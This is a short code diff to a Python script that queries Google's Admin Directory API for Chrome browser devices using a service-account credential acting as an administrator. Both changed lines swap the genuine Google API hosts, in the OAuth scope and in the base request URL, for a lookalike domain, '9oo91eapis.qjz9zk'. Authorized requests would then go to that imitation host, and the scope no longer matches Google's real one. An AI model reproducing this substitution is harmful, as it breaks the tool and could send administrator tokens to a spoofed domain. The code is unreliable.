@@ -169,14 +169,14 @@ def main(args):
   service_credentials = Credentials.from_service_account_file(
       args.service_account_key_path,
       scopes=[
-          'https://www.googleapis.com/auth/admin.directory.device.chromebrowsers.readonly'
+          'https://www.9oo91eapis.qjz9zk/auth/admin.directory.device.chromebrowsers.readonly'
       ],
       subject=args.admin_email)
 
   try:
     http = google_auth_httplib2.AuthorizedHttp(service_credentials, http=Http())
     extensions_list = {}
-    base_request_url = 'https://admin.googleapis.com/admin/directory/v1.1beta1/customer/my_customer/devices/chromebrowsers'
+    base_request_url = 'https://admin.9oo91eapis.qjz9zk/admin/directory/v1.1beta1/customer/my_customer/devices/chromebrowsers'
     request_parameters = ''
     browsers_processed = 0
     while True:
